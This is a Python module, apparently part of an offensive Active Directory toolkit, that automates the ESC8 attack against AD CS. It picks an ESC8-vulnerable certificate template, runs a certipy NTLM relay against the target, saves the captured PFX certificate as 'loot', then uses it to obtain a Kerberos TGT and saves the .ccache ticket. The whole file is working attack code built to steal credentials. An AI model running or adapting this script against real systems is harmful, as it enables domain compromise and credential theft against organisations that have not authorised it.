import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc8(session):
    print(blue("[*] Starting ESC8 abuse via NTLM relay to AD CS HTTP endpoints"), flush=True)

    # Pull CA IP and vulnerable template from session metadata
    ca = session.adcs_metadata['cas'][0]
    target_ip = session.dc_ip or ca.get("dns")
    template = None

    for t in ca.get("templates", []):
        if t.get("vulnerabilities") and "ESC8" in t["vulnerabilities"]:
            template = t["name"]
            break

    if not target_ip or not template:
        print(red("[-] Could not auto-resolve target IP or ESC8-vulnerable template from session."), flush=True)
        return

    print(green(f"[+] Selected target: {target_ip}"), flush=True)
    print(green(f"[+] Using vulnerable template: {template}"), flush=True)

    # Step 1: Launch certipy relay
    print(blue(f"[*] Step 1: Launching certipy relay to target {target_ip} using template {template}"), flush=True)
    relay_cmd = f"sudo certipy-ad relay -target {target_ip} -template {template}"
    print(yellow(f"[>] Command: {relay_cmd}"), flush=True)
    output, err = run_command(relay_cmd)
    print(output, flush=True)
    if err:
        print(red(err), flush=True)

    # Step 2: Locate PFX from output
    for line in output.splitlines():
        if line.strip().endswith(".pfx") and os.path.exists(line.strip()):
            pfx_file = line.strip()
            with open(pfx_file, "rb") as f:
                save_loot(os.path.basename(pfx_file), f.read(), binary=True)
            print(green(f"[+] Saved PFX to loot/{pfx_file}"), flush=True)

            # Step 3: Request TGT from PFX
            print(blue("[*] Step 3: Requesting TGT using acquired PFX"), flush=True)
            auth_cmd = f"certipy-ad auth -pfx {pfx_file}"
            output, err = run_command(auth_cmd)
            print(output, flush=True)
            if err:
                print(red(err), flush=True)

            # Step 4: Locate and save .ccache
            for subline in output.splitlines():
                if subline.strip().endswith(".ccache") and os.path.exists(subline.strip()):
                    ccache_file = subline.strip()
                    with open(ccache_file, "rb") as f:
                        save_loot(os.path.basename(ccache_file), f.read(), binary=True)
                    print(green(f"[+] Saved TGT to loot/{ccache_file}"), flush=True)
            break
    else:
        print(yellow("[!] No .pfx file found in relay output. You must coerce authentication manually."), flush=True)
